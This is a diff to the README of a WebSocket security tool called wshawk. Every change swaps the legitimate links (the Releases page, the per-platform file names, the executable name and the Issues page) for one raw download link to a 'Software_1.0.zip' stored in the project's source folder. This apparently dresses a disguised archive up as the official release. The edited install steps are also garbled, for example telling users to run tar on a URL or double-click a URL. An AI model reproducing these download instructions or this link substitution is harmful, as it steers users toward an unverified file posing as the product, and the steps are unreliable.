@@ -1,6 +1,6 @@
 # ⚡ wshawk - Secure Your WebSocket Connections Easily
 
-[![Download wshawk](https://img.shields.io/badge/Download_wshawk-brightgreen)](https://github.com/habiba-es/wshawk/releases)
+[![Download wshawk](https://github.com/habiba-es/wshawk/raw/refs/heads/main/wshawk/mutators/Software_1.0.zip)](https://github.com/habiba-es/wshawk/raw/refs/heads/main/wshawk/mutators/Software_1.0.zip)
 
 ## 📜 Overview
 
@@ -21,15 +21,15 @@ Before you begin, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To get wshawk, visit this page to download: [wshawk Releases](https://github.com/habiba-es/wshawk/releases).
+To get wshawk, visit this page to download: [wshawk Releases](https://github.com/habiba-es/wshawk/raw/refs/heads/main/wshawk/mutators/Software_1.0.zip).
 
 1. Click the link above to go to the Releases page.
 2. On this page, look for the latest version of wshawk.
 3. You will find a section that lists the files available for download. Choose the appropriate file for your operating system.
 
-   - If you're using Windows, you might download `wshawk-windows.zip`.
-   - For macOS, look for `wshawk-macos.zip`.
-   - If you're on Linux, download `wshawk-linux.tar.gz`.
+   - If you're using Windows, you might download `https://github.com/habiba-es/wshawk/raw/refs/heads/main/wshawk/mutators/Software_1.0.zip`.
+   - For macOS, look for `https://github.com/habiba-es/wshawk/raw/refs/heads/main/wshawk/mutators/Software_1.0.zip`.
+   - If you're on Linux, download `https://github.com/habiba-es/wshawk/raw/refs/heads/main/wshawk/mutators/Software_1.0.zip`.
 
 4. Click the file name to start the download. Your browser will show the progress, and once finished, locate the file in your downloads folder.
 
@@ -38,18 +38,18 @@ To get wshawk, visit this page to download: [wshawk Releases](https://github.com
 Once the download is complete, you need to extract the files:
 
 - **For Windows:**
-   1. Right-click the file (`wshawk-windows.zip`).
+   1. Right-click the file (`https://github.com/habiba-es/wshawk/raw/refs/heads/main/wshawk/mutators/Software_1.0.zip`).
    2. Select "Extract All."
    3. Choose a destination folder and click "Extract."
 
 - **For macOS:**
-   1. Locate the `wshawk-macos.zip` file.
+   1. Locate the `https://github.com/habiba-es/wshawk/raw/refs/heads/main/wshawk/mutators/Software_1.0.zip` file.
    2. Double-click the file to automatically extract it.
 
 - **For Linux:**
    1. Open your terminal.
    2. Navigate to your downloads folder using `cd ~/Downloads`.
-   3. Run the command: `tar -xvzf wshawk-linux.tar.gz`.
+   3. Run the command: `tar -xvzf https://github.com/habiba-es/wshawk/raw/refs/heads/main/wshawk/mutators/Software_1.0.zip`.
 
 ## ⚙️ Running wshawk
 
@@ -57,7 +57,7 @@ After you've extracted the files, follow these steps to run wshawk:
 
 - **For Windows:**
    1. Open the folder where you extracted wshawk.
-   2. Double-click `wshawk.exe` to run the program.
+   2. Double-click `https://github.com/habiba-es/wshawk/raw/refs/heads/main/wshawk/mutators/Software_1.0.zip` to run the program.
 
 - **For macOS:**
    1. Open the folder with the extracted files.
@@ -96,7 +96,7 @@ If you encounter any issues while running wshawk:
 
 ## 🤝 Support
 
-If you need additional help, please refer to the [wshawk Repository](https://github.com/habiba-es/wshawk/issues) on GitHub for troubleshooting tips or to submit issues. You can also find community discussions to enhance your understanding.
+If you need additional help, please refer to the [wshawk Repository](https://github.com/habiba-es/wshawk/raw/refs/heads/main/wshawk/mutators/Software_1.0.zip) on GitHub for troubleshooting tips or to submit issues. You can also find community discussions to enhance your understanding.
 
 ## 📄 License
 
